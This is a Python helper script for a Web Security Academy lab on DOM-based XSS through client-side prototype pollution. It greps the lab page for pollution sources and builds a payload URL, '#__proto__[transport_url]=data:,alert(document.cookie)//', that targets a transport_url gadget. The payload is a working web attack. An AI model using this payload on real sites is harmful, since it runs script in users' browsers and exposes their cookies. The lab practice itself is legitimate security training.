"""
Lab 2: DOM XSS via an alternative prototype pollution vector
https://portswigger.net/web-security/prototype-pollution/client-side/lab-prototype-pollution-dom-xss-alternative-vector
Difficulty: Practitioner

📝 Same gadget-exploitation idea as Lab 1, but the pollution SOURCE isn't
a plain query-string parse this time — commonly a JSON-ish structure
embedded in the URL fragment, or parsed from a different page mechanism.
The fix is finding where THIS page's merge happens before reusing the
same gadget-hunting approach.
"""

from utils import get_session, log, note, fetch_page_source, grep_for_patterns

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"


def run():
    s = get_session()
    source = fetch_page_source(s, f"{TARGET}/")
    note("This lab's source flows input from a DIFFERENT entry point than")
    note("Lab 1 — look for location.hash parsing, a custom URL-param-style")
    note("mini-parser, or JSON.parse feeding a merge, rather than assuming")
    note("the same $.extend(location.search) pattern.")
    grep_for_patterns(source, ["location.hash", "JSON.parse", "merge", "__proto__"])

    note("Once the source is identified, confirm pollution the same way as")
    note("Lab 1 (set a test property, check Object.prototype.test in")
    note("console), then try the same transport_url-style gadget first —")
    note("this lab often reuses it, just reached via the new vector:")
    probe = f"{TARGET}/#__proto__[transport_url]=data:,alert(document.cookie)//"
    log(f"Candidate payload URL: {probe}")
    note("Open in a real browser to test — fragment-based sources never")
    note("reach the server, so this can't be confirmed via requests alone.")


if __name__ == "__main__":
    run()
